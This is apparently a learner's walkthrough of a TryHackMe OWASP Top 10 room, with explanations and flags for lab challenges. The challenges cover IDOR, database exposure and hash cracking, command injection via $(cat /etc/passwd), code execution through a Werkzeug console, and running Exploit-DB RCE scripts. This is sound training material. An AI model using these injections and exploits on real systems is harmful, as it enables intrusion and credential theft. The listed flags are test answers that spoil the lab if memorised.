Link: https://tryhackme.com/room/owasptop102021 

<img width="300" height="300" alt="image" src="https://github.com/user-attachments/assets/9f5e904f-1aeb-4a99-ba10-5ba95008d602" />

Learn about and exploit each of the OWASP Top 10 vulnerabilities; the 10 most critical web security risks.

**Module 1: Introduction**

<img width="2667" height="818" alt="image" src="https://github.com/user-attachments/assets/a8d7e090-bd39-42fa-b28d-61fd4d054ca4" />

This room breaks each OWASP topic down and includes details on the vulnerabilities, how they occur, and how you can exploit them. You will put the theory into practice by completing supporting challenges.

1. Broken Access Control

2. Cryptographic Failures

3. Injection

4. Insecure Design

5. Security Misconfiguration

6. Vulnerable and Outdated Components

7. Identification and Authentication Failures

8. Software and Data Integrity Failures

9. Security Logging & Monitoring Failures

10. Server-Side Request Forgery (SSRF)

The room has been designed for beginners and assumes no previous security knowledge.


**Answer the questions below**

1. _Read the above._

Answer: No answer needed

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


**Module 2: Accessing Machines**

<img width="638" height="466" alt="image" src="https://github.com/user-attachments/assets/6e88f5fc-d9fe-436b-836e-dbcbf4640cda" />

Some tasks will have you learning by doing, often through hacking a virtual machine. First, let's start the Virtual Machine by pressing the green Start Machine button below. 

**Answer the questions below**

1. _Connect to our network or deploy the AttackBox._

Answer: No answer needed

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

**MOdule 3: 1. Broken Access Control**

<img width="856" height="448" alt="image" src="https://github.com/user-attachments/assets/8c092717-f0da-43d4-a0e0-904d991a3b21" />

Websites have pages that are protected from regular visitors. For example, only the site's admin user should be able to access a page to manage other users. If a website visitor can access protected pages they are not meant to see, then the access controls are broken.

A regular visitor being able to access protected pages can lead to the following:

- Being able to view sensitive information from other users

- Accessing unauthorized functionality

Simply put, broken access control allows attackers to bypass authorisation, allowing them to view sensitive data or perform tasks they aren't supposed to.

For example, [a vulnerability was found in 2019](https://bugs.xdavidhu.me/google/2021/01/11/stealing-your-private-videos-one-frame-at-a-time/), where an attacker could get any single frame from a Youtube video marked as private. The researcher who found the vulnerability showed that he could ask for several frames and somewhat reconstruct the video. Since the expectation from a user when marking a video as private would be that nobody had access to it, this was indeed accepted as a broken access control vulnerability.'

**Answer the questions below**

1. _Read and understand what broken access control is._

Answer: No answer needed

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

**Module 4: Broken Access Control (IDOR Challenge)**

**Insecure Direct Object Reference**

IDOR or Insecure Direct Object Reference refers to an access control vulnerability where you can access resources you wouldn't ordinarily be able to see. This occurs when the programmer exposes a Direct Object Reference, which is just an identifier that refers to specific objects within the server. By object, we could mean a file, a user, a bank account in a banking application, or anything really.

For example, let's say we're logging into our bank account, and after correctly authenticating ourselves, we get taken to a URL like this https://bank.thm/account?id=111111. On that page, we can see all our important bank details, and a user would do whatever they need to do and move along their way, thinking nothing is wrong.

<img width="805" height="364" alt="image" src="https://github.com/user-attachments/assets/263b4c98-98f7-459e-ae3b-5411e7e11913" />

There is, however, a potentially huge problem here, anyone may be able to change the `id` parameter to something else like `222222`, and if the site is incorrectly configured, then he would have access to someone else's bank information.

<img width="805" height="365" alt="image" src="https://github.com/user-attachments/assets/d67c8efc-b302-47e1-a361-a12d198d3d52" />

The application exposes a direct object reference through the id parameter in the URL, which points to specific accounts. Since the application isn't checking if the logged-in user owns the referenced account, an attacker can get sensitive information from other users because of the IDOR vulnerability. Notice that direct object references aren't the problem, but rather that the application doesn't validate if the logged-in user should have access to the requested account.

**Answer the questions below**

1. _Read and understand how IDOR works._

Answer: No answer needed

2. _Deploy the machine and go to http://MACHINE IP - Login with the username noot and the password test1234._

Answer: No answer needed

**_Explanation:_**

Go to http://MACHINE_IP 

<img width="1917" height="767" alt="image" src="https://github.com/user-attachments/assets/d95c2ab9-937b-41fe-93c3-1e00284c3770" />

And now enter the creds from the question 

<img width="1573" height="504" alt="image" src="https://github.com/user-attachments/assets/fb9942ad-9c52-4503-8c1f-e263a4b0300b" />


3. _Look at other users' notes. What is the flag?_

Answer: `flag{fivefourthree}`

**_Explanation:_**

Now that we have logged in, we see the id in the URL is currently 1 and we will try multiple numbers  here and when we change the `id` to `0` we can see the flag

<img width="318" height="35" alt="image" src="https://github.com/user-attachments/assets/d885686a-71b7-4883-9052-df45b923e176" />

<img width="1771" height="597" alt="image" src="https://github.com/user-attachments/assets/f5c12052-1a53-4685-b27c-81cde6f34cdc" />

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

**Module 5: 2. Cryptographic Failures**

**Cryptographic Failures**

A cryptographic failure refers to any vulnerability arising from the misuse (or lack of use) of cryptographic algorithms for protecting sensitive information. Web applications require cryptography to provide confidentiality for their users at many levels.

Take, for example, a secure email application:

- When you are accessing your email account using your browser, you want to be sure that the communications between you and the server are encrypted. That way, any eavesdropper trying to capture your network packets won't be able to recover the content of your email addresses. When we encrypt the network traffic between the client and server, we usually refer to this as encrypting data in transit.

- Since your emails are stored in some server managed by your provider, it is also desirable that the email provider can't read their client's emails. To this end, your emails might also be encrypted when stored on the servers. This is referred to as encrypting data at rest.

Cryptographic failures often end up in web apps accidentally divulging sensitive data. This is often data directly linked to customers (e.g. names, dates of birth, financial information), but it could also be more technical information, such as usernames and passwords.

At more complex levels, taking advantage of some cryptographic failures often involves techniques such as "Man in The Middle Attacks", whereby the attacker would force user connections through a device they control. Then, they would take advantage of weak encryption on any transmitted data to access the intercepted information (if the data is even encrypted in the first place). Of course, many examples are much simpler, and vulnerabilities can be found in web apps that can be exploited without advanced networking knowledge. Indeed, in some cases, the sensitive data can be found directly on the web server itself.

The web application in this box contains one such vulnerability. To continue, read through the supporting material in the following tasks.

**Answer the questions below**

1. _Read the introduction to Cryptographic Failures and deploy the machine._

Answer: No answer needed

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

**Module 6: Cryptographic Failures (Supporting Material 1)**

The most common way to store a large amount of data in a format easily accessible from many locations is in a database. This is perfect for something like a web application, as many users may interact with the website at any time. Database engines usually follow the Structured Query Language (SQL) syntax.

In a production environment, it is common to see databases set up on dedicated servers running a database service such as MySQL or MariaDB; however, databases can also be stored as files. These are referred to as "flat-file" databases, as they are stored as a single file on the computer. This is much easier than setting up an entire database server and could potentially be seen in smaller web applications. Accessing a database server is outwith the scope of today's task, so let's focus instead on flat-file databases.

As mentioned previously, flat-file databases are stored as a file on the disk of a computer. Usually, this would not be a problem for a web app, but what happens if the database is stored underneath the root directory of the website (i.e. one of the files accessible to the user connecting to the website)? Well, we can download and query it on our own machine, with full access to everything in the database. Sensitive Data Exposure, indeed!

That is a big hint for the challenge, so let's briefly cover some of the syntax we would use to query a flat-file database.

The most common (and simplest) format of a flat-file database is an SQLite database. These can be interacted with in most programming languages and have a dedicated client for querying them on the command line. This client is called sqlite3 and is installed on many Linux distributions by default.

Let's suppose we have successfully managed to download a database:

```
user@linux$ ls -l 
-rw-r--r-- 1 user user 8192 Feb  2 20:33 example.db
                                                                                                                                                              
user@linux$ file example.db 
example.db: SQLite 3.x database, last written using SQLite version 3039002, file counter 1, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 1
```

We can see that there is an SQLite database in the current folder.

To access it, we use `sqlite3 <database-name>`:

```
user@linux$ sqlite3 example.db                     
SQLite version 3.39.2 2022-07-21 15:24:47
Enter ".help" for usage hints.
sqlite> 
```

From here, we can see the tables in the database by using the .tables command:

```
user@linux$ sqlite3 example.db                     
SQLite version 3.39.2 2022-07-21 15:24:47
Enter ".help" for usage hints.
sqlite> .tables
customers
```

At this point, we can dump all the data from the table, but we won't necessarily know what each column means unless we look at the table information. First, let's use `PRAGMA table_info(customers);` to see the table information. Then we'll use SELECT * FROM customers; to dump the information from the table:

```
sqlite> PRAGMA table_info(customers);
0|cudtID|INT|1||1
1|custName|TEXT|1||0
2|creditCard|TEXT|0||0
3|password|TEXT|1||0

sqlite> SELECT * FROM customers;
0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99
1|John Walters|4671 5376 3366 8125|fef08f333cc53594c8097eba1f35726a
2|Lena Abdul|4353 4722 6349 6685|b55ab2470f160c331a99b8d8a1946b19
3|Andrew Miller|4059 8824 0198 5596|bc7b657bd56e4386e3397ca86e378f70
4|Keith Wayman|4972 1604 3381 8885|12e7a36c0710571b3d827992f4cfe679
5|Annett Scholz|5400 1617 6508 1166|e2795fc96af3f4d6288906a90a52a47f
```

We can see from the table information that there are four columns: custID, custName, creditCard and password. You may notice that this matches up with the results. Take the first row:

`0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99`
 

We have the custID (0), the custName (Joy Paulson), the creditCard (4916 9012 2231 7905) and a password hash (5f4dcc3b5aa765d61d8327deb882cf99).

In the next task, we'll look at cracking this hash.

**Answer the questions below**

1. _Read and understand the supporting material on SQLite Databases._

Answer: No answer needed

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

**Module 7: Cryptographic Failures (Supporting Material 2)**

We saw how to query an SQLite database for sensitive data in the previous task. We found a collection of password hashes, one for each user. In this task, we will briefly cover how to crack these.

When it comes to hash cracking, Kali comes pre-installed with various tools. If you know how to use these, then feel free to do so; however, they are outwith the scope of this material.

Instead, we will be using the online tool: [Crackstation](https://crackstation.net/). This website is extremely good at cracking weak password hashes. For more complicated hashes, we would need more sophisticated tools; however, all of the crackable password hashes used in today's challenge are weak MD5 hashes, which Crackstation should handle very nicely.

When we navigate to the website, we are met with the following interface:

<img width="1011" height="318" alt="image" src="https://github.com/user-attachments/assets/b3f8b78b-f08e-4161-8c99-aee8f7ba08b3" />

Let's try pasting the password hash for Joy Paulson, which we found in the previous task (`5f4dcc3b5aa765d61d8327deb882cf99`). We solve the Captcha, then click the "Crack Hashes" button:

<img width="1012" height="395" alt="image" src="https://github.com/user-attachments/assets/dbf8ef73-ee91-40df-8fe9-38d5da409d9e" />

We see that the hash was successfully broken, and the user's password was "password". How secure!

It's worth noting that Crackstation works using a massive wordlist. If the password is not in the wordlist, then Crackstation will not be able to break the hash.

The challenge is guided, so if Crackstation fails to break a hash in today's box, you can assume that the hash has been specifically designed not to be crackable.

**Answer the questions below**

1. _Read the supporting material about cracking hashes._

Answer: No answer needed

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

**Module 8: Cryptographic Failures (Challenge)**

It's now time to put what you've learnt into practice! For this challenge, connect to the web application at http://MACHINE-IP

**Answer the questions below**

1. _Have a look around the web app. The developer has left themselves a note indicating that there is sensitive data in a specific directory._

_What is the name of the mentioned directory?_

Answer: `/assets`

**_Explanation:_**

We go to http://MACHINE-IP:81 and now we right click and select inspect

<img width="1915" height="999" alt="image" src="https://github.com/user-attachments/assets/bcb0a7af-3ad7-44b1-9e10-c82e580d70d3" />

Now we take a closer look and  see a href with a button called `login` and linking to the page `/login.php` and we navigate to this page

<img width="1918" height="316" alt="image" src="https://github.com/user-attachments/assets/69825401-ba4b-40bd-8b54-a285275ceb17" />

Now at `http:MACHINE_IP:81/login.php` we select Inspect and we can see the name of the directory is assets

<img width="1920" height="445" alt="image" src="https://github.com/user-attachments/assets/e6de455f-8a7e-4d3e-858c-57c61c3d8721" />

2. _Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?_

Answer: `webapp.db`

**_Explanation:_**

Now we go to `http:MACHINE_IP:81/assets` and we a file called `webapp.db` which looks like a flat-file database

<img width="521" height="318" alt="image" src="https://github.com/user-attachments/assets/96e417fc-857a-4574-86ee-e7c9a6f0c615" />

3. _Use the supporting material to access the sensitive data. What is the password hash of the admin user?_

Answer: `6eea9b7ef19179a06954edd0f6c05ceb`

**_Explanation:_**

We download this file by clicking on it from the `/assets` page

And now open the terminal and use the command `sqlite3 webapp.db`

<img width="924" height="184" alt="image" src="https://github.com/user-attachments/assets/8b415de1-322c-4235-8961-2b0d2e352e92" />

Now we use `.tables` to see the list of tables and we can use `users` table

<img width="191" height="96" alt="image" src="https://github.com/user-attachments/assets/ff623a5f-90bb-4e6a-a125-9c5b8dc5dc5e" />

Now we use `select password from users where username ='admin';` and we get a password hash 

<img width="714" height="110" alt="image" src="https://github.com/user-attachments/assets/ab78a254-b33d-4c99-b691-de650aa550cd" />

4. _Crack the hash.
What is the admin's plaintext password?_

Answer: `qwertyuiop`

**_Explanation:_**

Now we go to https://crackstation.net/ and crack the above password hash

<img width="1091" height="410" alt="image" src="https://github.com/user-attachments/assets/d66578b5-7dfd-4a06-a6d5-60d3ba042d63" />

5. _Log in as the admin. What is the flag?_

Answer: `THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}`

**_Explanation:_**

We go to "http/MACHINE_IP:81/login.php" and log in as admin

<img width="781" height="187" alt="image" src="https://github.com/user-attachments/assets/032cb5e4-3953-4cbc-92fc-ebf8ed6770d1" />

We see the flag

<img width="489" height="219" alt="image" src="https://github.com/user-attachments/assets/0bc21bfb-b0ec-4663-81d9-ba858d5666ae" />

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

**Module 9: 3. Injection**

**Injection**

Injection flaws are very common in applications today. These flaws occur because the application interprets user-controlled input as commands or parameters. Injection attacks depend on what technologies are used and how these technologies interpret the input. Some common examples include:

- **_SQL Injection_**: This occurs when user-controlled input is passed to SQL queries. As a result, an attacker can pass in SQL queries to manipulate the outcome of such queries. This could potentially allow the attacker to access, modify and delete information in a database when this input is passed into database queries. This would mean an attacker could steal sensitive information such as personal details and credentials.

- **_Command Injection_**: This occurs when user input is passed to system commands. As a result, an attacker can execute arbitrary system commands on application servers, potentially allowing them to access users' systems.

The main defence for preventing injection attacks is ensuring that user-controlled input is not interpreted as queries or commands. There are different ways of doing this:

- Using an allow list: when input is sent to the server, this input is compared to a list of safe inputs or characters. If the input is marked as safe, then it is processed. Otherwise, it is rejected, and the application throws an error.

- Stripping input: If the input contains dangerous characters, these are removed before processing.

Dangerous characters or input is classified as any input that can change how the underlying data is processed. Instead of manually constructing allow lists or stripping input, various libraries exist that can perform these actions for you.

**Answer the questions below**

1. _I've understood Injection attacks._

Answer: No answer needed

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

**Module 10: 3.1. Command Injection**

**Command Injection**

Command Injection occurs when server-side code (like PHP) in a web application makes a call to a function that interacts with the server's console directly. An injection web vulnerability allows an attacker to take advantage of that call to execute operating system commands arbitrarily on the server. The possibilities for the attacker from here are endless: they could list files, read their contents, run some basic commands to do some recon on the server or whatever they wanted, just as if they were sitting in front of the server and issuing commands directly into the command line. 

Once the attacker has a foothold on the web server, they can start the usual enumeration of your systems and look for ways to pivot around.

 Code Example

Let's consider a scenario: MooCorp has started developing a web-based application for cow ASCII art with customisable text. While searching for ways to implement their app, they've come across the cowsay command in Linux, which does just that! Instead of coding a whole web application and the logic required to make cows talk in ASCII, they decide to write some simple code that calls the cowsay command from the operating system's console and sends back its contents to the website.

Let's look at the code they used for their app.  See if you can determine why their implementation is vulnerable to command injection.  We'll go over it below.

```
<?php
    if (isset($_GET["mooing"])) {
        $mooing = $_GET["mooing"];
        $cow = 'default';

        if(isset($_GET["cow"]))
            $cow = $_GET["cow"];
        
        passthru("perl /usr/bin/cowsay -f $cow $mooing");
    }
?>

```

In simple terms, the above snippet does the following:

1. Checking if the parameter "mooing" is set. If it is, the variable $mooing gets what was passed into the input field.

2. Checking if the parameter "cow" is set. If it is, the variable $cow gets what was passed through the parameter.

3. The program then executes the function `passthru("perl /usr/bin/cowsay -f $cow $mooing");`. The passthru function simply executes a command in the operating system's console and sends the output back to the user's browser. You can see that our command is formed by concatenating the $cow and $mooing variables at the end of it. Since we can manipulate those variables, we can try injecting additional commands by using simple tricks. If you want to, you can read the docs on passthru() on PHP's website for more information on the function itself.

<img width="1438" height="420" alt="image" src="https://github.com/user-attachments/assets/ee024a37-dba6-4817-a4f0-fb8ee22d6aa8" />

**Exploiting Command Injection**

Now that we know how the application works behind the curtains, we will take advantage of a bash feature called "inline commands" to abuse the cowsay server and execute any arbitrary command we want. Bash allows you to run commands within commands. This is useful for many reasons, but in our case, it will be used to inject a command within the cowsay server to get it executed.

To execute inline commands, you only need to enclose them in the following format $(your_command_here). If the console detects an inline command, it will execute it first and then use the result as the parameter for the outer command. Look at the following example, which runs whoami as an inline command inside an echo command:

<img width="1572" height="392" alt="image" src="https://github.com/user-attachments/assets/c2821052-a8ee-4eff-885c-534587433a31" />

So coming back to the cowsay server, here's what would happen if we send an inline command to the web application:

<img width="1501" height="482" alt="image" src="https://github.com/user-attachments/assets/82be1139-689d-4167-bbb4-ae7a547db2d5" />

Since the application accepts any input from us, we can inject an inline command which will get executed and used as a parameter for cowsay. This will make our cow say whatever the command returns! In case you are not that familiar with Linux, here are some other commands you may want to try:

- whoami

- id

- ifconfig/ip addr

- uname -a

- ps -ef

To complete the questions below, navigate to http://MACHINE_IP:82/ and exploit the cowsay server. 

**Answer the questions below**

1. _What strange text file is in the website's root directory?_

Answer: `drpepper.txt`

**_Explanation:_**

Go to http://MACHINE_IP:82/ and we can see something like this 

<img width="722" height="338" alt="image" src="https://github.com/user-attachments/assets/66514358-fa98-4f89-a80b-472f1da367a6" />

Now we use the command `$(ls)` and we find a file called `drpepper.txt`

<img width="637" height="477" alt="image" src="https://github.com/user-attachments/assets/59db86db-5deb-49f8-a4b8-ab5af2dc0462" />

2. _How many non-root/non-service/non-daemon users are there?_

Answer: `0`

**_Explanation:_**

We use the command `$(cat /etc/passwd)` and see no users which doesn't belong to neither of the three (non-root/non-service/non-daemon)

<img width="611" height="894" alt="image" src="https://github.com/user-attachments/assets/afa29c2e-03aa-487b-b42a-a79f57016521" />
<img width="424" height="423" alt="image" src="https://github.com/user-attachments/assets/0a8511fa-dd78-4e37-ad1b-d6ae5daca4d3" />


3. _What user is this app running as?_

Answer: `apache`

**_Explanation:_**

We use the command `$(whoami)`

<img width="665" height="463" alt="image" src="https://github.com/user-attachments/assets/81a3ac38-54ab-4b71-8750-b31b3a172d78" />

4. _What is the user's shell set as?_

Answer: `/sbin/nologin`

**_Explanation:_**

We use the command `$(cat /etc/passwd | grep apache)` and scrolling down at the bottom, we see

<img width="733" height="900" alt="image" src="https://github.com/user-attachments/assets/2bd0aba5-ebe5-4b18-919f-007692f83635" />
<img width="372" height="399" alt="image" src="https://github.com/user-attachments/assets/7bb468fd-a713-4a3b-9ecd-70fbd8e2de48" />

5. _What version of Alpine Linux is running?_

Answer: `3.16.0`

**_Explanation:_**

We use the following command `$(cat /etc/alpine-release)` 

<img width="615" height="426" alt="image" src="https://github.com/user-attachments/assets/017c3f7b-112a-4f77-b9bc-84b8937caa63" />

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

**Module 11: 4. Insecure Design**

**Insecure Design**

Insecure design refers to vulnerabilities which are inherent to the application's architecture. They are not vulnerabilities regarding bad implementations or configurations, but the idea behind the whole application (or a part of it) is flawed from the start. Most of the time, these vulnerabilities occur when an improper threat modelling is made during the planning phases of the application and propagate all the way up to your final app. Some other times, insecure design vulnerabilities may also be introduced by developers while adding some "shortcuts" around the code to make their testing easier. A developer could, for example, disable the OTP validation in the development phases to quickly test the rest of the app without manually inputting a code at each login but forget to re-enable it when sending the application to production.

**Insecure Password Resets**

A good example of such vulnerabilities occurred on [Instagram a while ago](https://thezerohack.com/hack-any-instagram). Instagram allowed users to reset their forgotten passwords by sending them a 6-digit code to their mobile number via SMS for validation. If an attacker wanted to access a victim's account, he could try to brute-force the 6-digit code. As expected, this was not directly possible as Instagram had rate-limiting implemented so that after 250 attempts, the user would be blocked from trying further. 

<img width="1413" height="390" alt="image" src="https://github.com/user-attachments/assets/1e4212dd-60b5-4be9-8304-f62ccd9c1463" />

However, it was found that the rate-limiting only applied to code attempts made from the same IP. If an attacker had several different IP addresses from where to send requests, he could now try 250 codes per IP. For a 6-digit code, you have a million possible codes, so an attacker would need 1000000/250 = 4000 IPs to cover all possible codes. This may sound like an insane amount of IPs to have, but cloud services make it easy to get them at a relatively small cost, making this attack feasible.

<img width="1311" height="659" alt="image" src="https://github.com/user-attachments/assets/fa4f24f0-f784-4c74-b3b4-1c6374064279" />

Notice how the vulnerability is related to the idea that no user would be capable of using thousands of IP addresses to make concurrent requests to try and brute-force a numeric code. The problem is in the design rather than the implementation of the application in itself.

Since insecure design vulnerabilities are introduced at such an early stage in the development process, resolving them often requires rebuilding the vulnerable part of the application from the ground up and is usually harder to do than any other simple code-related vulnerability. The best approach to avoid such vulnerabilities is to perform threat modelling at the early stages of the development lifecycle. To get more information on how to implement secure development lifecycles, be sure to check out the SSDLC room.

**Practical Example**

Navigate to http://MACHINE-IP:85 and get into joseph's account. This application also has a design flaw in its password reset mechanism. Can you figure out the weakness in the proposed design and how to abuse it?

**Answer the questions below**

1. _Try to reset joseph's password. Keep in mind the method used by the site to validate if you are indeed joseph._


Answer: No answer needed

**_Explanation:_**

We visit the site and see a button called "I forgot my password"

<img width="1566" height="511" alt="image" src="https://github.com/user-attachments/assets/3c852ed3-92a8-4bf5-95d6-351118b027e0" />

Now in forgot password page, we enter the username `joseph`

<img width="1585" height="508" alt="image" src="https://github.com/user-attachments/assets/e2dd5968-f5ef-4e55-8c10-0d2e9852b23e" />

After the above step, we get to a page where a security question is asked 

<img width="1580" height="579" alt="image" src="https://github.com/user-attachments/assets/dd6e92f6-7673-45ab-a244-8e15fa9d486b" />

After browsing through all security questions we choose fav colour question

<img width="1536" height="504" alt="new" src="https://github.com/user-attachments/assets/9a21c337-0dc6-45ce-b76b-e537c8a8fb5e" />

Now we will try different colours and finally we get to know the fav colour is `green`

<img width="1571" height="564" alt="image" src="https://github.com/user-attachments/assets/8d5eedb9-6982-42a2-9df7-e150e9223bdb" />

Now we got the new password `2umzoqePYl8jMR`

<img width="1566" height="400" alt="image" src="https://github.com/user-attachments/assets/3647dad4-9cd2-4d5e-b4ec-24af02cdab6a" />


2. _What is the value of the flag in joseph's account?_

Answer: `THM{Not_3ven_c4tz_c0uld_sav3_U!}`

**_Explanation:_**

We login with the new password 

<img width="1559" height="504" alt="image" src="https://github.com/user-attachments/assets/8147fe45-a3d7-4bb2-8a35-73baace46837" />

And see the a directory called "Private" with a file called "flag.txt" which contains the flag

<img width="1585" height="662" alt="image" src="https://github.com/user-attachments/assets/bbfe63c3-b35a-403f-8621-6fa18effc32e" />

<img width="1619" height="495" alt="image" src="https://github.com/user-attachments/assets/df6e9a25-22b7-425d-9076-ca6340c4b448" />

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

**Module 12: 5. Security Misconfiguration**

**Security Misconfiguration**

Security Misconfigurations are distinct from the other Top 10 vulnerabilities because they occur when security could have been appropriately configured but was not. Even if you download the latest up-to-date software, poor configurations could make your installation vulnerable.

Security misconfigurations include:

- Poorly configured permissions on cloud services, like S3 buckets.

- Having unnecessary features enabled, like services, pages, accounts or privileges.

- Default accounts with unchanged passwords.

- Error messages that are overly detailed and allow attackers to find out more about the system.

- Not using [HTTP security headers](https://owasp.org/www-project-secure-headers/).

This vulnerability can often lead to more vulnerabilities, such as default credentials giving you access to sensitive data, XML External Entities (XXE) or command injection on admin pages.

For more info, look at the [OWASP top 10 entry for Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/).

**Debugging Interfaces**

A common security misconfiguration concerns the exposure of debugging features in production software. Debugging features are often available in programming frameworks to allow the developers to access advanced functionality that is useful for debugging an application while it's being developed. Attackers could abuse some of those debug functionalities if somehow, the developers forgot to disable them before publishing their applications.

One example of such a vulnerability was allegedly used when [Patreon got hacked in 2015](https://labs.detectify.com/2015/10/02/how-patreon-got-hacked-publicly-exposed-werkzeug-debugger/). Five days before Patreon was hacked, a security researcher reported to Patreon that he had found an open debug interface for a Werkzeug console. Werkzeug is a vital component in Python-based web applications as it provides an interface for web servers to execute the Python code. Werkzeug includes a debug console that can be accessed either via URL on /console, or it will also be presented to the user if an exception is raised by the application. In both cases, the console provides a Python console that will run any code you send to it. For an attacker, this means he can execute commands arbitrarily.

<img width="655" height="327" alt="image" src="https://github.com/user-attachments/assets/3d88f4c3-1b89-42ac-ba02-c88a907cf987" />

Practical example

This VM showcases a Security Misconfiguration as part of the OWASP Top 10 Vulnerabilities list.

Navigate to http://MACHINE_IP:86 and try to exploit the security misconfiguration to read the application's source code.

**Answer the questions below**

1. _Navigate to http://MACHINE_IP:86/console to access the Werkzeug console._

Answer: No answer needed

2. _Use the Werkzeug console to run the following Python code to execute the ls -l command on the server:_

`import os; print(os.popen("ls -l").read())`

 _What is the database file name (the one with the .db extension) in the current directory?_

Answer: `todo.db`

**_Explanation:_**

We type `import os; print(os.popen("ls -l").read())` and we see a file named `todo.db` 

<img width="1920" height="394" alt="image" src="https://github.com/user-attachments/assets/fe796dd1-2a3f-47e3-9979-fbbc7ed003dc" />

3. _Modify the code to read the contents of the app.py file, which contains the application's source code. What is the value of the secret_flag variable in the source code?_

Answer: `THM{Just_a_tiny_misconfiguration}`

**_Explanation:_**

We use the command `import os; print(os.popen("cat app.py").read())` and see the value of secret_flag

<img width="1918" height="629" alt="image" src="https://github.com/user-attachments/assets/0542155f-828d-4444-a370-078f27a59e5b" />

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

**Module 13: 6. Vulnerable and Outdated Components**

Vulnerable and Outdated Components

Occasionally, you may find that the company/entity you're pen-testing is using a program with a well-known vulnerability.

For example, let's say that a company hasn't updated their version of WordPress for a few years, and using a tool such as [WPScan](https://wpscan.com/), you find that it's version 4.6. Some quick research will reveal that WordPress 4.6 is vulnerable to an unauthenticated remote code execution(RCE) exploit, and even better, you can find an exploit already made on [Exploit-DB](https://www.exploit-db.com/exploits/41962).

As you can see, this would be quite devastating because it requires very little work on the attacker's part. Since the vulnerability is already well known, someone else has likely made an exploit for the vulnerability already. The situation worsens when you realise that it's really easy for this to happen. If a company misses a single update for a program they use, it could be vulnerable to any number of attacks.

**Answer the questions below**

1. _Read about the vulnerability._

Answer: No answer needed

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

**Module 14: Vulnerable and Outdated Components - Exploit**

Recall that since this is about known vulnerabilities, most of the work has already been done for us. Our main job is to find out the information of the software and research it until we can find an exploit. Let's go through that with an example web application.

<img width="476" height="327" alt="image" src="https://github.com/user-attachments/assets/c1d460fa-fe96-4025-8a51-a5e218ae1396" />

What do you know? This server has the default page for the Nostromo web server. Now that we have a version number and a software name, we can use Exploit-DB to try and find an exploit for this particular version.

<img width="849" height="265" alt="image" src="https://github.com/user-attachments/assets/5f2cb27b-7f67-4b80-9df9-d835a46e0ca5" />

Lucky us, the top result happens to be an exploit script. Let's download it and try to get code execution. Running this script on its own teaches us a very important lesson.

```
user@linux$ python 47837.py
Traceback (most recent call last):
  File "47837.py", line 10, in <module>
    cve2019_16278.py
NameError: name 'cve2019_16278' is not defined
```

Exploits you download from the Internet may not work the first time. It helps to understand the programming language the script is in so that, if needed, you can fix any bugs or make any modifications, as quite a few scripts on Exploit-DB expect you to make modifications.

Fortunately, the error was caused by a line that should have been commented out, so it's an easy fix.

```
# Exploit Title: nostromo 1.9.6 - Remote Code Execution
# Date: 2019-12-31
# Exploit Author: Kr0ff
# Vendor Homepage:
# Software Link: http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz
# Version: 1.9.6
# Tested on: Debian
# CVE : CVE-2019-16278

cve2019_16278.py  # This line needs to be commented.

#!/usr/bin/env python
```

Fixing that, let's try and run the program again.

```
user@linux$ python2 47837.py 127.0.0.1 80 id


                                        _____-2019-16278
        _____  _______    ______   _____\    \
   _____\    \_\      |  |      | /    / |    |
  /     /|     ||     /  /     /|/    /  /___/|
 /     / /____/||\    \  \    |/|    |__ |___|/
|     | |____|/ \ \    \ |    | |       \
|     |  _____   \|     \|    | |     __/ __
|\     \|\    \   |\         /| |\    \  /  \
| \_____\|    |   | \_______/ | | \____\/    |
| |     /____/|    \ |     | /  | |    |____/|
 \|_____|    ||     \|_____|/    \|____|   | |
        |____|/                        |___|/




HTTP/1.1 200 OK
Date: Fri, 03 Feb 2023 04:58:34 GMT
Server: nostromo 1.9.6
Connection: close

uid=1001(_nostromo) gid=1001(_nostromo) groups=1001(_nostromo)

        
```

Boom! We have RCE. Now it's important to note that most scripts will tell you what arguments you need to provide. Exploit developers will rarely make you read potentially hundreds of lines of code just to figure out how to use the script.

It is also worth noting that it may not always be this easy. Sometimes you will just be given a version number, like in this case, but other times you may need to dig through the HTML source or even take a lucky guess on an exploit script. But realistically, if it is a known vulnerability, there's probably a way to discover what version the application is running.

That's really it. The great thing about this piece of the OWASP Top 10 is that the work is already done for us, we just need to do some basic research, and as a penetration tester, you're already doing that quite a bit.

**Answer the questions below**

1. _Read the above!_

Answer: No answer needed

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

**Module 15: Vulnerable and Outdated Components - Lab**

Navigate to http://MACHINE_IP:84 where you'll find a vulnerable application. All the information you need to exploit it can be found online. 

**Answer the questions below**

1. _What is the content of the /opt/flag.txt file?_

Answer: `THM{But_1ts_n0t_my_f4ult!}`

**_Explanation:_**

We go to `http://MACHINE_IP:84`

Now we see it is made using PHP with MYSQL 

<img width="1920" height="1001" alt="image" src="https://github.com/user-attachments/assets/e43e9460-9063-4a78-8786-eede32859d54" />

Now we search for an exploit and we find one in the exploitDB with CVE as `47887` and we download this payload

<img width="1920" height="1003" alt="image" src="https://github.com/user-attachments/assets/0135738e-0ebf-4939-90a2-8e52615804a3" />

Now we use this command `python3 47887.py http://MACHINE_IP:84/` on our local machine and then type `y` when asked if we want to launch a shell and we can see RCE

<img width="922" height="281" alt="image" src="https://github.com/user-attachments/assets/d0c7d5c1-42e1-4c7b-b8fc-84be35fbc4aa" />

Now we the command `cat /opt/flag.txt` and get the flag

